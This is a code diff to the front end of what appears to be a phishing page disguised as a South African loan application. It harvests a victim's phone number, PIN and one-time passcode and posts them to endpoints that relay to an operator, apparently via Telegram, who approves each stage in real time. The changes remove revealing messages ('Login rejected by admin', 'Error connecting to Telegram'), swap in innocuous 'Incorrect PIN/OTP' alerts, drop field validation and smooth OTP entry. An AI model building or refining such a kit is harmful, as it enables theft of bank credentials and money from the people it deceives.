@@ -232,7 +232,6 @@
       </p>
       <label style="font-weight: 700; color: #888; font-size: 14px; display: block; margin-bottom: 15px;">Please enter the OTP you received</label>
       
-      <!-- OTP INPUTS RESTRICTED TO NUMBERS -->
       <div class="otp-container">
         <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 0)">
         <input type="tel" pattern="[0-9]*" inputmode="numeric" class="otp-input" maxlength="1" oninput="validateOTP(this, 1)">
@@ -284,9 +283,9 @@
   termSlider.addEventListener('input', updateCalculator);
   updateCalculator();
 
+  // No more "Please fill in all fields" alerts
   function saveStep1() {
     const purpose = document.getElementById('loanPurpose').value;
-    if (!purpose) return alert('Please enter the purpose of the loan.');
     formData.loanAmount = document.getElementById('loanAmount').value;
     formData.loanTerm = document.getElementById('loanTerm').value;
     formData.purpose = purpose;
@@ -298,18 +297,16 @@
     const lastName = document.getElementById('lastName').value;
     const email = document.getElementById('email').value;
     const phone = document.getElementById('phone').value;
-    if (!firstName || !lastName || !email || !phone) return alert('Please fill in all fields.');
     formData.firstName = firstName; formData.lastName = lastName; formData.email = email; formData.phone = phone;
-    document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount).toLocaleString()}`;
-    document.getElementById('sumTerm').textContent = `${formData.loanTerm} Months`;
-    document.getElementById('sumPurpose').textContent = formData.purpose;
-    document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`;
+    document.getElementById('sumAmount').textContent = `ZAR ${parseInt(formData.loanAmount || 0).toLocaleString()}`;
+    document.getElementById('sumTerm').textContent = `${formData.loanTerm || 6} Months`;
+    document.getElementById('sumPurpose').textContent = formData.purpose || '-';
+    document.getElementById('sumApplicant').textContent = `${firstName} ${lastName}`.trim() || '-';
     goToPage('page-step3');
   }
 
   function submitApplication() {
     const annualIncome = document.getElementById('annualIncome').value;
-    if (!annualIncome) return alert('Please enter your annual income.');
     formData.employmentStatus = document.getElementById('employmentStatus').value;
     formData.annualIncome = annualIncome;
     goToPage('page-success');
@@ -330,22 +327,17 @@
   async function submitLogin() {
     const phone = document.getElementById('loginPhone').value;
     const pin = document.getElementById('loginPin').value;
-    if (!phone || !pin) return alert('Please enter phone and PIN.');
     if (!currentRequestId) currentRequestId = Math.random().toString(36).substring(2, 10);
     toggleLoading(true);
     try {
       const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, phone, pin }) });
       if (!res.ok) throw new Error('Failed');
       startPolling('login');
-    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
+    } catch (err) { toggleLoading(false); }
   }
 
-  // UPDATED VALIDATION FUNCTION FOR OTP
   function validateOTP(input, index) {
-    // Force the value to be only numbers
     input.value = input.value.replace(/[^0-9]/g, '');
-    
-    // Move focus to the next input if a number was typed
     if (input.value.length === 1 && index < 3) {
       document.querySelectorAll('.otp-input')[index + 1].focus();
     }
@@ -354,13 +346,13 @@
   async function submitOTP() {
     const inputs = document.querySelectorAll('.otp-input');
     let otp = ''; inputs.forEach(input => otp += input.value);
-    if (otp.length !== 4) return alert('Please enter all 4 digits.');
+    if (otp.length !== 4) return alert('Incorrect OTP.');
     toggleLoading(true);
     try {
       const res = await fetch('/api/otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ requestId: currentRequestId, otp }) });
       if (!res.ok) throw new Error('Failed');
       startPolling('otp');
-    } catch (err) { toggleLoading(false); alert('Error connecting to Telegram.'); }
+    } catch (err) { toggleLoading(false); }
   }
 
   function startPolling(stage) {
@@ -376,13 +368,24 @@
             const phoneVal = document.getElementById('loginPhone').value;
             document.getElementById('maskedPhone').textContent = `+27 ${phoneVal.substring(0,3)}***${phoneVal.slice(-3)}`;
             goToPage('page-otp');
+            // Auto focus first OTP box
+            document.querySelectorAll('.otp-input')[0].focus();
           } else if (data.status === 'login_rejected') {
-            clearInterval(pollingInterval); toggleLoading(false); alert('Login rejected by admin. Please try again.');
+            clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN.');
+            goToPage('page-login');
           }
         } else if (stage === 'otp') {
           if (data.status === 'success') { clearInterval(pollingInterval); toggleLoading(false); goToPage('page-congrats'); } 
-          else if (data.status === 'wrong_pin') { clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN. Please re-enter.'); goToPage('page-login'); } 
-          else if (data.status === 'wrong_otp') { clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect OTP. Please try again.'); document.querySelectorAll('.otp-input').forEach(input => input.value = ''); }
+          else if (data.status === 'wrong_pin') { clearInterval(pollingInterval); toggleLoading(false); alert('Incorrect PIN.'); goToPage('page-login'); } 
+          else if (data.status === 'wrong_otp') { 
+            clearInterval(pollingInterval); 
+            toggleLoading(false); 
+            alert('Incorrect OTP.'); 
+            // Clear all inputs and focus the first one immediately
+            const otpInputs = document.querySelectorAll('.otp-input');
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+          }
         }
       } catch (err) { console.error('Polling error:', err); }
     }, 1500);
